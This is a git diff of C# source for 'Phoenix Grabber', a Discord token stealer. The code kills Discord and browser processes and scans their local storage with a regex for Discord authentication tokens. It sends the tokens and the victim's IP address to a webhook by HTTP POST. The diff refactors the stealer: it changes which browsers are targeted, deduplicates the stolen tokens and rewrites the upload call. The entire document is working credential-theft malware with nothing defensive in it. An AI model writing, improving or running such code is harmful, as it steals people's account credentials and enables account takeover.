@@ -5,11 +5,9 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Reflection;
-using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
-using Microsoft.CSharp;
 using System.Web.Script.Serialization;
 
 namespace Program
@@ -31,41 +29,32 @@ namespace Program
 
         static void Start()
         {
-            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "chrome", "chromesxs", "Yandex", "msedge", "brave", "neon", "amigo", "torch", "kometa", "orbitum", "Cent", "7chrome", "sputnik", "vivaldi", "epic", "ucozmedia", "iridium" };
+            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "chrome", "chromesxs", "Yandex", "msedge", "brave", "vivaldi", "epic" };
             foreach (Process process in Process.GetProcesses())
             {
-                foreach (var list in processlist)
+                foreach (var name in processlist)
                 {
-                    if (process.ProcessName == list)
+                    if (process.ProcessName == name)
                         process.Kill();
                 }
             }
             List<string> locations = new List<string>();
             var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            locations.Add(appdata + "\\Discord\\Local Storage\\leveldb\\");
+            locations.Add(appdata + "\\discord\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\discordcanary\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\discordptb\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
+            locations.Add(appdata + "\\Mozilla\\Firefox\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
             locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
-            locations.Add(localappdata + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Torch\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\");
-            locations.Add(localappdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\");
             foreach (var path in locations)
             {
                 if (!Directory.Exists(path)) continue;
@@ -73,7 +62,10 @@ namespace Program
                 {
                     if (file.Equals("LOCK")) continue;
                     foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}|mfa\\.[\\w-]{84}"))
-                        tokens.Add(match.Value);
+                    {
+                        if (!tokens.Contains(match.Value))
+                            tokens.Add(match.Value);
+                    }
                 }
             }
             var result = string.Join("\\n", tokens.ToArray());
@@ -81,9 +73,13 @@ namespace Program
                 result = "N/A";
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            WebClient client = new WebClient();
-            client.Headers.Add("content-type", "application/json");
-            client.UploadData("Webhook", "POST", Encoding.UTF8.GetBytes("{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"title\":\"Phoenix Grabber\",\"fields\":[{\"inline\":true,\"name\":\"IP Address:\",\"value\":\"" + IP() + "\"},{\"inline\":false,\"name\":\"Tokens:\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}"));
+            WebRequest request = WebRequest.Create("Webhook");
+            request.Method = "POST";
+            request.ContentType = "application/json";
+            using (var stream = new StreamWriter(request.GetRequestStream()))
+                stream.Write("{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"title\":\"Phoenix Grabber\",\"fields\":[{\"inline\":true,\"name\":\"IP Address:\",\"value\":\"" + IP() + "\"},{\"inline\":false,\"name\":\"Tokens:\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+            request.GetResponse();
+            request.Abort();
         }
         #endregion
 
